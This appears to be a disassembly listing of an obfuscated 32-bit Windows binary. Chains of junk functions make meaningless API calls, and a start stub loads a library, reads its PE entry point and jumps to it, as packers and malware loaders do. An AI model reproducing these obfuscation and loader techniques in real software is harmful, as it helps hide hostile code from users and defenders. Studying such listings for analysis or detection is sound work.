0x004d0000:	movl	%edi, %edi	; from: 0x004d0394(MAY)
0x004d0002:	pushl	%ebp
0x004d0003:	movl	%esp, %ebp
0x004d0005:	subl	$0x58, %esp
0x004d0008:	leal	0x1a0(%esi), %ecx
0x004d000e:	addl	$0xffffffcc, %esi
0x004d0011:	pushl	%ecx
0x004d0012:	pushl	$0x0
0x004d0014:	call	GetDC@user32.dll	; targets: 0xff000090(MAY)
0x004d001a:	popl	%ecx
0x004d001b:	pushl	%ecx
0x004d001c:	pushl	0x48(%ecx)
0x004d001f:	pushl	%ebx
0x004d0020:	pushl	0x16c(%ecx)
0x004d0026:	call	0x004d0788	; targets: 0x004d0788(MAY)
0x004d0040:	movl	%edi, %edi	; from: 0x004d0cdd(MAY)
0x004d0042:	pushl	%ebp
0x004d0043:	movl	%esp, %ebp
0x004d0045:	subl	$0x4c, %esp
0x004d0048:	movl	$0x4d300c, %edi
0x004d004d:	cmpl	$0x3c89, %edi
0x004d0053:	jbe	0x004d0043	; targets: 0x004d0055(MAY)
0x004d0055:	movl	$0x0, %ecx	; from: 0x004d0053(MAY)
0x004d005a:	pushl	%ecx
0x004d005b:	call	LocalUnlock@kernel32.dll	; targets: 0xff0000b0(MAY)
0x004d0061:	pushl	%edi
0x004d0062:	pushl	0x1f0(%edi)
0x004d0068:	pushl	%esi
0x004d0069:	pushl	%edx
0x004d006a:	call	0x004d0adc	; targets: 0x004d0adc(MAY)
0x004d0080:	movl	%edi, %edi	; from: 0x004d01f1(MAY)
0x004d0082:	pushl	%ebp
0x004d0083:	movl	%esp, %ebp
0x004d0085:	subl	$0x2c, %esp
0x004d0088:	leal	-100(%esi), %ebx
0x004d008b:	addl	%edx, %esi
0x004d008d:	pushl	$0x0
0x004d008f:	call	UnmapViewOfFile@kernel32.dll	; targets: 0xff000080(MAY)
0x004d0095:	pushl	%ebx
0x004d0096:	pushl	%edx
0x004d0097:	pushl	0x19c(%ebx)
0x004d009d:	pushl	%ecx
0x004d009e:	call	0x004d0c20	; targets: 0x004d0c20(MAY)
0x004d00b8:	movl	%edi, %edi	; from: 0x004d04dd(MAY)
0x004d00ba:	pushl	%ebp
0x004d00bb:	movl	%esp, %ebp
0x004d00bd:	subl	$0x5c, %esp
0x004d00c0:	leal	0x004d3158, %ebx
0x004d00c6:	cmpl	$0x3ce, %ebx
0x004d00cc:	jbe	0x004d00bb	; targets: 0x004d00ce(MAY)
0x004d00ce:	movl	$0x0, %edx	; from: 0x004d00cc(MAY)
0x004d00d3:	pushl	%edx
0x004d00d4:	call	LocalUnlock@kernel32.dll	; targets: 0xff0000b0(MAY)
0x004d00da:	pushl	%ebx
0x004d00db:	pushl	0x98(%ebx)
0x004d00e1:	pushl	%esi
0x004d00e2:	pushl	0x1a8(%ebx)
0x004d00e8:	call	0x004d0414	; targets: 0x004d0414(MAY)
0x004d0104:	movl	%edi, %edi	; from: 0x004d0871(MAY)
0x004d0106:	pushl	%ebp
0x004d0107:	movl	%esp, %ebp
0x004d0109:	subl	$0x5c, %esp
0x004d010c:	leal	-24(%ebx), %eax
0x004d010f:	addl	%eax, %ebx
0x004d0111:	pushl	%eax
0x004d0112:	pushl	%ebx
0x004d0113:	pushl	0xd8(%eax)
0x004d0119:	call	0x004d04ec	; targets: 0x004d04ec(MAY)
0x004d014c:	movl	%edi, %edi	; from: 0x004d0820(MAY)
0x004d014e:	pushl	%ebp
0x004d014f:	movl	%esp, %ebp
0x004d0151:	subl	$0x24, %esp
0x004d0154:	leal	0x004d306c, %edx
0x004d015a:	sbbl	%edx, 0x7c(%edx)
0x004d015d:	pushl	%edx
0x004d015e:	pushl	$0x0
0x004d0160:	call	TlsGetValue@kernel32.dll	; targets: 0xff000230(MAY)
0x004d0166:	popl	%edx
0x004d0167:	pushl	%edx
0x004d0168:	pushl	%esi
0x004d0169:	pushl	%ebx
0x004d016a:	pushl	%eax
0x004d016b:	pushl	0x140(%edx)
0x004d0171:	call	0x004d0700	; targets: 0x004d0700(MAY)
0x004d0194:	movl	%edi, %edi	; from: 0x004d0505(MAY)
0x004d0196:	pushl	%ebp
0x004d0197:	movl	%esp, %ebp
0x004d0199:	subl	$0x4c, %esp
0x004d019c:	movl	$0x4d311c, %ecx
0x004d01a1:	andl	%edi, -24(%ebp)
0x004d01a4:	pushl	%ecx
0x004d01a5:	pushl	%ebx
0x004d01a6:	pushl	%edx
0x004d01a7:	call	0x004d0b6c	; targets: 0x004d0b6c(MAY)
0x004d01cc:	movl	%edi, %edi	; from: 0x004d09f8(MAY)
0x004d01ce:	pushl	%ebp
0x004d01cf:	movl	%esp, %ebp
0x004d01d1:	subl	$0x3c, %esp
0x004d01d4:	movl	$0x4d3074, %esi
0x004d01d9:	adcl	-12(%ebp), %edx
0x004d01dc:	pushl	$0x0
0x004d01de:	call	IsWindow@user32.dll	; targets: 0xff000240(MAY)
0x004d01e4:	pushl	%esi
0x004d01e5:	pushl	0x6c(%esi)
0x004d01e8:	pushl	0xbc(%esi)
0x004d01ee:	pushl	0x70(%esi)
0x004d01f1:	call	0x004d0080	; targets: 0x004d0080(MAY)
0x004d020c:	movl	%edi, %edi	; from: 0x004d07e4(MAY)
0x004d020e:	pushl	%ebp
0x004d020f:	movl	%esp, %ebp
0x004d0211:	subl	$0x20, %esp
0x004d0214:	leal	0xec(%edx), %eax
0x004d021a:	addl	$0xffffff98, -72(%eax)
0x004d021e:	pushl	%eax
0x004d021f:	pushl	$0x0
0x004d0221:	call	GetDC@user32.dll	; targets: 0xff000090(MAY)
0x004d0227:	popl	%eax
0x004d0228:	pushl	%eax
0x004d0229:	pushl	%ebx
0x004d022a:	pushl	0x1f4(%eax)
0x004d0230:	pushl	%edx
0x004d0231:	call	0x004d0c6c	; targets: 0x004d0c6c(MAY)
0x004d0254:	movl	%edi, %edi	; from: 0x004d06de(MAY)
0x004d0256:	pushl	%ebp
0x004d0257:	movl	%esp, %ebp
0x004d0259:	subl	$0x50, %esp
0x004d025c:	leal	-168(%edx), %esi
0x004d0262:	xorl	-32(%ebp), %eax
0x004d0265:	pushl	%esi
0x004d0266:	pushl	%edi
0x004d0267:	pushl	0x190(%esi)
0x004d026d:	pushl	0x1f4(%esi)
0x004d0273:	call	0x004d09c0	; targets: 0x004d09c0(MAY)
0x004d0298:	movl	%edi, %edi	; from: 0x004d0b8d(MAY)
0x004d029a:	pushl	%ebp
0x004d029b:	movl	%esp, %ebp
0x004d029d:	subl	$0x24, %esp
0x004d02a0:	leal	0x004d3074, %eax
0x004d02a6:	addl	%edx, 0x188(%eax)
0x004d02ac:	pushl	%eax
0x004d02ad:	pushl	0x188(%eax)
0x004d02b3:	pushl	0x120(%eax)
0x004d02b9:	pushl	%edx
0x004d02ba:	pushl	0x98(%eax)
0x004d02c0:	call	0x004d080c	; targets: 0x004d080c(MAY)
0x004d02e8:	movl	%edi, %edi	; from: 0x004d0a39(MAY)
0x004d02ea:	pushl	%ebp
0x004d02eb:	movl	%esp, %ebp
0x004d02ed:	subl	$0x28, %esp
0x004d02f0:	movl	$0x4d3048, %eax
0x004d02f5:	addl	%edi, %edx
0x004d02f7:	pushl	%eax
0x004d02f8:	pushl	0x10(%eax)
0x004d02fb:	pushl	%ecx
0x004d02fc:	pushl	%ecx
0x004d02fd:	call	0x004d07c8	; targets: 0x004d07c8(MAY)
0x004d032c:	movl	%edi, %edi	; from: 0x004d0bca(MAY)
0x004d032e:	pushl	%ebp
0x004d032f:	movl	%esp, %ebp
0x004d0331:	subl	$0x4c, %esp
0x004d0334:	leal	0x004d31a4, %ecx
0x004d033a:	cmpl	$0x6fc0, %ecx
0x004d0340:	jb	0x004d032f	; targets: 0x004d0342(MAY)
0x004d0342:	pushl	%ecx	; from: 0x004d0340(MAY)
0x004d0343:	pushl	0xf0(%ecx)
0x004d0349:	pushl	0x1d0(%ecx)
0x004d034f:	call	0x004d097c	; targets: 0x004d097c(MAY)
0x004d0374:	movl	%edi, %edi	; from: 0x004d042b(MAY)
0x004d0376:	pushl	%ebp
0x004d0377:	movl	%esp, %ebp
0x004d0379:	subl	$0x44, %esp
0x004d037c:	leal	0x004d3058, %esi
0x004d0382:	movl	$0xffffffbf, 0x148(%esi)
0x004d038c:	pushl	%esi
0x004d038d:	pushl	%edx
0x004d038e:	pushl	0x104(%esi)
0x004d0394:	call	0x004d0000	; targets: 0x004d0000(MAY)
0x004d03c0:	movl	%edi, %edi	; from: 0x004d07b1(MAY)
0x004d03c2:	pushl	%ebp
0x004d03c3:	movl	%esp, %ebp
0x004d03c5:	subl	$0x44, %esp
0x004d03c8:	leal	0x004d3128, %ebx
0x004d03ce:	cmpl	$0x2f32, %ebx
0x004d03d4:	jbe	0x004d03c3	; targets: 0x004d03d6(MAY)
0x004d03d6:	pushl	%ebx	; from: 0x004d03d4(MAY)
0x004d03d7:	pushl	0x1a4(%ebx)
0x004d03dd:	pushl	0x154(%ebx)
0x004d03e3:	call	0x004d06b0	; targets: 0x004d06b0(MAY)
0x004d0414:	movl	%edi, %edi	; from: 0x004d00e8(MAY)
0x004d0416:	pushl	%ebp
0x004d0417:	movl	%esp, %ebp
0x004d0419:	subl	$0x50, %esp
0x004d041c:	leal	-204(%ebx), %ecx
0x004d0422:	adcl	%edi, %edx
0x004d0424:	pushl	%ecx
0x004d0425:	pushl	(%ecx)
0x004d0427:	pushl	0x54(%ecx)
0x004d042a:	pushl	%edi
0x004d042b:	call	0x004d0374	; targets: 0x004d0374(MAY)
0x004d0458:	movl	%edi, %edi	; from: 0x004d0b48(MAY)
0x004d045a:	pushl	%ebp
0x004d045b:	movl	%esp, %ebp
0x004d045d:	subl	$0x24, %esp
0x004d0460:	movl	$0x4d3134, %edx
0x004d0465:	andl	$0xffffd9f9, -204(%edx)
0x004d046f:	pushl	%edx
0x004d0470:	movl	$0x0, %edi
0x004d0475:	pushl	%edi
0x004d0476:	call	UnmapViewOfFile@kernel32.dll	; targets: 0xff000080(MAY)
0x004d047c:	popl	%edx
0x004d047d:	pushl	%edx
0x004d047e:	pushl	0x180(%edx)
0x004d0484:	pushl	%eax
0x004d0485:	call	0x004d05b0	; targets: 0x004d05b0(MAY)

start:
0x004d04a4:	pushl	$0x0
0x004d04a6:	call	SetLastError@kernel32.dll	; targets: 0xff0001f0(MAY)
0x004d04ac:	pushl	$0x0
0x004d04ae:	call	Sleep@kernel32.dll	; targets: 0xff0000d0(MAY)
0x004d04b4:	pushl	$0x2
0x004d04b6:	xorl	%eax, %eax
0x004d04b8:	leal	0x4d3200(,%eax,2), %eax
0x004d04bf:	pushl	$0x0
0x004d04c1:	leal	0xc(%eax), %ecx
0x004d04c4:	addb	$0xffffffb0, (%ecx)
0x004d04c7:	pushl	%eax
0x004d04c8:	nop	
0x004d04c9:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff000120(MAY)
0x004d04cf:	leal	0x3b(%eax), %edx
0x004d04d2:	movl	(%edx), %ecx
0x004d04d4:	movl	0x28(%eax,%ecx), %eax
0x004d04d8:	movb	$0x40, %ah
0x004d04da:	pusha	
0x004d04db:	cmpb	%ah, %al
0x004d04dd:	ja	0x004d00b8	; targets: 0x004d04e3(MAY), 0x004d00b8(MAY)
0x004d04e3:	popa		; from: 0x004d04dd(MAY)
0x004d04e4:	ret	; targets: 0xfee70000(MAY)

0x004d04ec:	movl	%edi, %edi	; from: 0x004d0119(MAY)
0x004d04ee:	pushl	%ebp
0x004d04ef:	movl	%esp, %ebp
0x004d04f1:	subl	$0x2c, %esp
0x004d04f4:	movl	$0x4d3064, %esi
0x004d04f9:	movl	%esi, -12(%ebp)
0x004d04fc:	pushl	%esi
0x004d04fd:	pushl	0x18c(%esi)
0x004d0503:	pushl	%ecx
0x004d0504:	pushl	%edx
0x004d0505:	call	0x004d0194	; targets: 0x004d0194(MAY)
0x004d0528:	movl	%edi, %edi	; from: 0x004d0a83(MAY)
0x004d052a:	pushl	%ebp
0x004d052b:	movl	%esp, %ebp
0x004d052d:	subl	$0x3c, %esp
0x004d0530:	movl	$0x4d3040, %eax
0x004d0535:	subl	$0x45, %edx
0x004d0538:	pushl	%eax
0x004d0539:	pushl	$0x0
0x004d053b:	call	GlobalFree@kernel32.dll	; targets: 0xff000250(MAY)
0x004d0541:	popl	%eax
0x004d0542:	pushl	%eax
0x004d0543:	pushl	0x1c0(%eax)
0x004d0549:	pushl	0x1b4(%eax)
0x004d054f:	pushl	%ebx
0x004d0550:	pushl	%edi
0x004d0551:	call	0x004d0ba8	; targets: 0x004d0ba8(MAY)
0x004d0574:	movl	%edi, %edi	; from: 0x004d0af6(MAY)
0x004d0576:	pushl	%ebp
0x004d0577:	movl	%esp, %ebp
0x004d0579:	subl	$0x38, %esp
0x004d057c:	movl	$0x4d307c, %ecx
0x004d0581:	addl	$0xffff816e, 0x2c(%ecx)
0x004d0588:	pushl	%ecx
0x004d0589:	call	GetLastError@kernel32.dll	; targets: 0xff000050(MAY)
0x004d058f:	popl	%ecx
0x004d0590:	pushl	%ecx
0x004d0591:	pushl	0xac(%ecx)
0x004d0597:	pushl	%edi
0x004d0598:	call	0x004d0740	; targets: 0x004d0740(MAY)
0x004d05b0:	movl	%edi, %edi	; from: 0x004d0485(MAY)
0x004d05b2:	pushl	%ebp
0x004d05b3:	movl	%esp, %ebp
0x004d05b5:	subl	$0x2c, %esp
0x004d05b8:	movl	$0x4d31a4, %esi
0x004d05bd:	movl	%edx, -36(%ebp)
0x004d05c0:	pushl	%esi
0x004d05c1:	pushl	0xe4(%esi)
0x004d05c7:	pushl	0x3c(%esi)
0x004d05ca:	pushl	0x15c(%esi)
0x004d05d0:	call	0x004d0be4	; targets: 0x004d0be4(MAY)
0x004d05fc:	movl	%edi, %edi	; from: 0x004d067a(MAY)
0x004d05fe:	pushl	%ebp
0x004d05ff:	movl	%esp, %ebp
0x004d0601:	subl	$0x5c, %esp
0x004d0604:	leal	0x004d309c, %eax
0x004d060a:	cmpl	$0x5d74, %eax
0x004d060f:	je	0x004d05ff	; targets: 0x004d0611(MAY)
0x004d0611:	pushl	%eax	; from: 0x004d060f(MAY)
0x004d0612:	pushl	0x1a8(%eax)
0x004d0618:	pushl	%edx
0x004d0619:	pushl	0x108(%eax)
0x004d061f:	pushl	0x130(%eax)
0x004d0625:	call	0x004d0a18	; targets: 0x004d0a18(MAY)
0x004d065c:	movl	%edi, %edi	; from: 0x004d0c02(MAY)
0x004d065e:	pushl	%ebp
0x004d065f:	movl	%esp, %ebp
0x004d0661:	subl	$0x54, %esp
0x004d0664:	leal	0x004d30a4, %ecx
0x004d066a:	addl	-72(%ecx), %ebx
0x004d066d:	pushl	%ecx
0x004d066e:	pushl	0xa8(%ecx)
0x004d0674:	pushl	0xd0(%ecx)
0x004d067a:	call	0x004d05fc	; targets: 0x004d05fc(MAY)
0x004d06b0:	movl	%edi, %edi	; from: 0x004d03e3(MAY)
0x004d06b2:	pushl	%ebp
0x004d06b3:	movl	%esp, %ebp
0x004d06b5:	subl	$0x5c, %esp
0x004d06b8:	leal	0x004d30e8, %edx
0x004d06be:	adcl	$0x6e50, %edi
0x004d06c4:	pushl	%edx
0x004d06c5:	movl	$0x0, %esi
0x004d06ca:	pushl	%esi
0x004d06cb:	call	SetLastError@kernel32.dll	; targets: 0xff0001f0(MAY)
0x004d06d1:	popl	%edx
0x004d06d2:	pushl	%edx
0x004d06d3:	pushl	0x24(%edx)
0x004d06d6:	pushl	%edi
0x004d06d7:	pushl	0xec(%edx)
0x004d06dd:	pushl	%esi
0x004d06de:	call	0x004d0254	; targets: 0x004d0254(MAY)
0x004d0700:	movl	%edi, %edi	; from: 0x004d0171(MAY)
0x004d0702:	pushl	%ebp
0x004d0703:	movl	%esp, %ebp
0x004d0705:	subl	$0x48, %esp
0x004d0708:	leal	0x24(%edx), %eax
0x004d070b:	adcl	%esi, -44(%ebp)
0x004d070e:	pushl	%eax
0x004d070f:	pushl	0x14(%eax)
0x004d0712:	pushl	%esi
0x004d0713:	pushl	0x90(%eax)
0x004d0719:	call	0x004d0a5c	; targets: 0x004d0a5c(MAY)
0x004d0740:	movl	%edi, %edi	; from: 0x004d0598(MAY)
0x004d0742:	pushl	%ebp
0x004d0743:	movl	%esp, %ebp
0x004d0745:	subl	$0x1c, %esp
0x004d0748:	movl	$0x4d3110, %eax
0x004d074d:	cmpl	$0x4ae5, %eax
0x004d0752:	jb	0x004d0743	; targets: 0x004d0754(MAY)
0x004d0754:	pushl	%eax	; from: 0x004d0752(MAY)
0x004d0755:	pushl	$0x0
0x004d0757:	call	SetLastError@kernel32.dll	; targets: 0xff0001f0(MAY)
0x004d075d:	popl	%eax
0x004d075e:	pushl	%eax
0x004d075f:	pushl	0xc4(%eax)
0x004d0765:	pushl	0x38(%eax)
0x004d0768:	pushl	%esi
0x004d0769:	pushl	0xb0(%eax)
0x004d076f:	call	0x004d0934	; targets: 0x004d0934(MAY)
0x004d0788:	movl	%edi, %edi	; from: 0x004d0026(MAY)
0x004d078a:	pushl	%ebp
0x004d078b:	movl	%esp, %ebp
0x004d078d:	subl	$0x20, %esp
0x004d0790:	leal	0x004d3028, %esi
0x004d0796:	addl	$0xffffe359, -20(%ebp)
0x004d079d:	movl	$0x0, %ebx
0x004d07a2:	pushl	%ebx
0x004d07a3:	call	IsWindow@user32.dll	; targets: 0xff000240(MAY)
0x004d07a9:	pushl	%esi
0x004d07aa:	pushl	0x168(%esi)
0x004d07b0:	pushl	%edx
0x004d07b1:	call	0x004d03c0	; targets: 0x004d03c0(MAY)
0x004d07c8:	movl	%edi, %edi	; from: 0x004d02fd(MAY)
0x004d07ca:	pushl	%ebp
0x004d07cb:	movl	%esp, %ebp
0x004d07cd:	subl	$0x28, %esp
0x004d07d0:	leal	0x30(%eax), %edx
0x004d07d3:	sbbl	$0x1d92, %eax
0x004d07d8:	pushl	%edx
0x004d07d9:	pushl	0x94(%edx)
0x004d07df:	pushl	0x70(%edx)
0x004d07e2:	pushl	%eax
0x004d07e3:	pushl	%ebx
0x004d07e4:	call	0x004d020c	; targets: 0x004d020c(MAY)
0x004d080c:	movl	%edi, %edi	; from: 0x004d02c0(MAY)
0x004d080e:	pushl	%ebp
0x004d080f:	movl	%esp, %ebp
0x004d0811:	subl	$0x30, %esp
0x004d0814:	movl	$0x4d30a4, %ebx
0x004d0819:	xorl	%eax, -44(%ebp)
0x004d081c:	pushl	%ebx
0x004d081d:	pushl	%edx
0x004d081e:	pushl	%edi
0x004d081f:	pushl	%edi
0x004d0820:	call	0x004d014c	; targets: 0x004d014c(MAY)
0x004d084c:	movl	%edi, %edi	; from: 0x004d0c96(MAY)
0x004d084e:	pushl	%ebp
0x004d084f:	movl	%esp, %ebp
0x004d0851:	subl	$0x3c, %esp
0x004d0854:	leal	0x004d30e4, %ebx
0x004d085a:	subl	$0x25a6, %ecx
0x004d0860:	pushl	$0x0
0x004d0862:	call	UnmapViewOfFile@kernel32.dll	; targets: 0xff000080(MAY)
0x004d0868:	pushl	%ebx
0x004d0869:	pushl	%edi
0x004d086a:	pushl	0x1f0(%ebx)
0x004d0870:	pushl	%edi
0x004d0871:	call	0x004d0104	; targets: 0x004d0104(MAY)
0x004d0898:	movl	%edi, %edi	; from: 0x004d099b(MAY)
0x004d089a:	pushl	%ebp
0x004d089b:	movl	%esp, %ebp
0x004d089d:	subl	$0x2c, %esp
0x004d08a0:	adcl	%esi, -176(%esi)
0x004d08a6:	leal	-4(%esi), %edx
0x004d08a9:	pushl	%edx
0x004d08aa:	movl	$0x6ac, %esi
0x004d08af:	pushl	%esi
0x004d08b0:	pushl	$0x6ac
0x004d08b5:	movl	$0x40001, %edx
0x004d08ba:	pushl	%edx
0x004d08bb:	movl	$0x862985c2, %edx
0x004d08c0:	pushl	0x7a239a86(%edx)
0x004d08c6:	subl	$0x2, (%esp)
0x004d08ca:	movl	$0x4d202c, %edx
0x004d08cf:	popl	(%edx)
0x004d08d1:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff0001fe(MAY)
0x004d0934:	movl	%edi, %edi	; from: 0x004d076f(MAY)
0x004d0936:	pushl	%ebp
0x004d0937:	movl	%esp, %ebp
0x004d0939:	subl	$0x54, %esp
0x004d093c:	leal	0x004d3044, %esi
0x004d0942:	andl	$0x1fb7, 0x54(%esi)
0x004d0949:	pushl	%esi
0x004d094a:	pushl	0x184(%esi)
0x004d0950:	pushl	0xfc(%esi)
0x004d0956:	call	0x004d0b1c	; targets: 0x004d0b1c(MAY)
0x004d097c:	movl	%edi, %edi	; from: 0x004d034f(MAY)
0x004d097e:	pushl	%ebp
0x004d097f:	movl	%esp, %ebp
0x004d0981:	subl	$0x2c, %esp
0x004d0984:	leal	0x004d3140, %esi
0x004d098a:	orl	-196(%esi), %edi
0x004d0990:	pushl	%esi
0x004d0991:	pushl	0x1d4(%esi)
0x004d0997:	pushl	%ebx
0x004d0998:	pushl	0x68(%esi)
0x004d099b:	call	0x004d0898	; targets: 0x004d0898(MAY)
0x004d09c0:	movl	%edi, %edi	; from: 0x004d0273(MAY)
0x004d09c2:	pushl	%ebp
0x004d09c3:	movl	%esp, %ebp
0x004d09c5:	subl	$0x48, %esp
0x004d09c8:	leal	0x004d301c, %edx
0x004d09ce:	andl	$0xffffbc61, -72(%ebp)
0x004d09d5:	pushl	%edx
0x004d09d6:	leal	-28(%edx), %eax	; from: 0x004d09e2(MAY)
0x004d09d9:	pushl	%eax
0x004d09da:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000030(MAY)
0x004d09e0:	testl	%eax, %eax
0x004d09e2:	jne	0x004d09d6	; targets: 0x004d09d6(MAY), 0x004d09e4(MAY)
0x004d09e4:	popl	%edx	; from: 0x004d09e2(MAY)
0x004d09e5:	pushl	%edx
0x004d09e6:	pushl	0x18(%edx)
0x004d09e9:	pushl	0xc8(%edx)
0x004d09ef:	pushl	0x58(%edx)
0x004d09f2:	pushl	0x12c(%edx)
0x004d09f8:	call	0x004d01cc	; targets: 0x004d01cc(MAY)
0x004d0a18:	movl	%edi, %edi	; from: 0x004d0625(MAY)
0x004d0a1a:	pushl	%ebp
0x004d0a1b:	movl	%esp, %ebp
0x004d0a1d:	subl	$0x38, %esp
0x004d0a20:	leal	0x004d3164, %ebx
0x004d0a26:	andl	$0xffffa4b7, -48(%ebp)
0x004d0a2d:	pushl	%ebx
0x004d0a2e:	pushl	0x5c(%ebx)
0x004d0a31:	pushl	%edx
0x004d0a32:	pushl	0x1b0(%ebx)
0x004d0a38:	pushl	%esi
0x004d0a39:	call	0x004d02e8	; targets: 0x004d02e8(MAY)
0x004d0a5c:	movl	%edi, %edi	; from: 0x004d0719(MAY)
0x004d0a5e:	pushl	%ebp
0x004d0a5f:	movl	%esp, %ebp
0x004d0a61:	subl	$0x40, %esp
0x004d0a64:	movl	$0x4d3164, %ecx
0x004d0a69:	andl	$0x55, %ebx
0x004d0a6c:	pushl	%ecx
0x004d0a6d:	movl	$0x0, %edx
0x004d0a72:	pushl	%edx
0x004d0a73:	call	FindClose@kernel32.dll	; targets: 0xff000270(MAY)
0x004d0a79:	popl	%ecx
0x004d0a7a:	pushl	%ecx
0x004d0a7b:	pushl	%edx
0x004d0a7c:	pushl	%ebx
0x004d0a7d:	pushl	0x108(%ecx)
0x004d0a83:	call	0x004d0528	; targets: 0x004d0528(MAY)
0x004d0a9c:	movl	%edi, %edi	; from: 0x004d0c48(MAY)
0x004d0a9e:	pushl	%ebp
0x004d0a9f:	movl	%esp, %ebp
0x004d0aa1:	subl	$0x54, %esp
0x004d0aa4:	leal	0x004d3014, %edi
0x004d0aaa:	xorl	0x11c(%edi), %eax
0x004d0ab0:	movl	$0x0, %ecx
0x004d0ab5:	pushl	%ecx
0x004d0ab6:	call	FindClose@kernel32.dll	; targets: 0xff000270(MAY)
0x004d0abc:	pushl	%edi
0x004d0abd:	pushl	0x48(%edi)
0x004d0ac0:	pushl	0x13c(%edi)
0x004d0ac6:	pushl	%eax
0x004d0ac7:	call	0x004d0cac	; targets: 0x004d0cac(MAY)
0x004d0adc:	movl	%edi, %edi	; from: 0x004d006a(MAY)
0x004d0ade:	pushl	%ebp
0x004d0adf:	movl	%esp, %ebp
0x004d0ae1:	subl	$0x5c, %esp
0x004d0ae4:	leal	0x004d30a8, %eax
0x004d0aea:	cmpl	$0x6aac, %eax
0x004d0aef:	jb	0x004d0adf	; targets: 0x004d0af1(MAY)
0x004d0af1:	pushl	%eax	; from: 0x004d0aef(MAY)
0x004d0af2:	pushl	0x28(%eax)
0x004d0af5:	pushl	%edx
0x004d0af6:	call	0x004d0574	; targets: 0x004d0574(MAY)
0x004d0b1c:	movl	%edi, %edi	; from: 0x004d0956(MAY)
0x004d0b1e:	pushl	%ebp
0x004d0b1f:	movl	%esp, %ebp
0x004d0b21:	subl	$0x5c, %esp
0x004d0b24:	movl	$0x4d308c, %ebx
0x004d0b29:	orl	$0x6293, 0x170(%ebx)
0x004d0b33:	movl	$0x0, %esi
0x004d0b38:	pushl	%esi
0x004d0b39:	call	LocalUnlock@kernel32.dll	; targets: 0xff0000b0(MAY)
0x004d0b3f:	pushl	%ebx
0x004d0b40:	pushl	%edi
0x004d0b41:	pushl	0x100(%ebx)
0x004d0b47:	pushl	%edx
0x004d0b48:	call	0x004d0458	; targets: 0x004d0458(MAY)
0x004d0b6c:	movl	%edi, %edi	; from: 0x004d01a7(MAY)
0x004d0b6e:	pushl	%ebp
0x004d0b6f:	movl	%esp, %ebp
0x004d0b71:	subl	$0x30, %esp
0x004d0b74:	movl	$0x4d30b4, %esi
0x004d0b79:	xorl	$0xffffffec, 0x2c(%esi)
0x004d0b7d:	pushl	$0x0
0x004d0b7f:	call	HeapDestroy@kernel32.dll	; targets: 0xff000260(MAY)
0x004d0b85:	pushl	%esi
0x004d0b86:	pushl	0x130(%esi)
0x004d0b8c:	pushl	%edi
0x004d0b8d:	call	0x004d0298	; targets: 0x004d0298(MAY)
0x004d0ba8:	movl	%edi, %edi	; from: 0x004d0551(MAY)
0x004d0baa:	pushl	%ebp
0x004d0bab:	movl	%esp, %ebp
0x004d0bad:	subl	$0x20, %esp
0x004d0bb0:	movl	$0x4d3108, %edi
0x004d0bb5:	sbbl	$0xffffffbf, -20(%ebp)
0x004d0bb9:	pushl	$0x0
0x004d0bbb:	call	TlsGetValue@kernel32.dll	; targets: 0xff000230(MAY)
0x004d0bc1:	pushl	%edi
0x004d0bc2:	pushl	0xf4(%edi)
0x004d0bc8:	pushl	%ebx
0x004d0bc9:	pushl	%edx
0x004d0bca:	call	0x004d032c	; targets: 0x004d032c(MAY)
0x004d0be4:	movl	%edi, %edi	; from: 0x004d05d0(MAY)
0x004d0be6:	pushl	%ebp
0x004d0be7:	movl	%esp, %ebp
0x004d0be9:	subl	$0x34, %esp
0x004d0bec:	movl	$0x4d307c, %edi
0x004d0bf1:	andl	$0x66e1, 0x164(%edi)
0x004d0bfb:	pushl	%edi
0x004d0bfc:	pushl	0x68(%edi)
0x004d0bff:	pushl	0x6c(%edi)
0x004d0c02:	call	0x004d065c	; targets: 0x004d065c(MAY)
0x004d0c20:	movl	%edi, %edi	; from: 0x004d009e(MAY)
0x004d0c22:	pushl	%ebp
0x004d0c23:	movl	%esp, %ebp
0x004d0c25:	subl	$0x40, %esp
0x004d0c28:	leal	0x13c(%ebx), %ecx
0x004d0c2e:	subl	%esi, %edi
0x004d0c30:	pushl	%ecx
0x004d0c31:	movl	$0x0, %edi
0x004d0c36:	pushl	%edi
0x004d0c37:	call	LocalUnlock@kernel32.dll	; targets: 0xff0000b0(MAY)
0x004d0c3d:	popl	%ecx
0x004d0c3e:	pushl	%ecx
0x004d0c3f:	pushl	0x1b8(%ecx)
0x004d0c45:	pushl	%edi
0x004d0c46:	pushl	%ebx
0x004d0c47:	pushl	%ebx
0x004d0c48:	call	0x004d0a9c	; targets: 0x004d0a9c(MAY)
0x004d0c6c:	movl	%edi, %edi	; from: 0x004d0231(MAY)
0x004d0c6e:	pushl	%ebp
0x004d0c6f:	movl	%esp, %ebp
0x004d0c71:	subl	$0x54, %esp
0x004d0c74:	movl	$0x4d3188, %esi
0x004d0c79:	movl	$0x24, -12(%ebp)
0x004d0c80:	pushl	$0x0
0x004d0c82:	call	FindClose@kernel32.dll	; targets: 0xff000270(MAY)
0x004d0c88:	pushl	%esi
0x004d0c89:	pushl	0x154(%esi)
0x004d0c8f:	pushl	%ecx
0x004d0c90:	pushl	0x98(%esi)
0x004d0c96:	call	0x004d084c	; targets: 0x004d084c(MAY)
0x004d0cac:	movl	%edi, %edi	; from: 0x004d0ac7(MAY)
0x004d0cae:	pushl	%ebp
0x004d0caf:	movl	%esp, %ebp
0x004d0cb1:	subl	$0x40, %esp
0x004d0cb4:	leal	0x140(%edi), %edx
0x004d0cba:	sbbl	%ecx, -184(%edx)
0x004d0cc0:	pushl	%edx
0x004d0cc1:	movl	$0x0, %edx
0x004d0cc6:	pushl	%edx
0x004d0cc7:	call	HeapDestroy@kernel32.dll	; targets: 0xff000260(MAY)
0x004d0ccd:	popl	%edx
0x004d0cce:	pushl	%edx
0x004d0ccf:	pushl	%eax
0x004d0cd0:	pushl	0x144(%edx)
0x004d0cd6:	pushl	0x13c(%edx)
0x004d0cdc:	pushl	%ecx
0x004d0cdd:	call	0x004d0040	; targets: 0x004d0040(MAY)
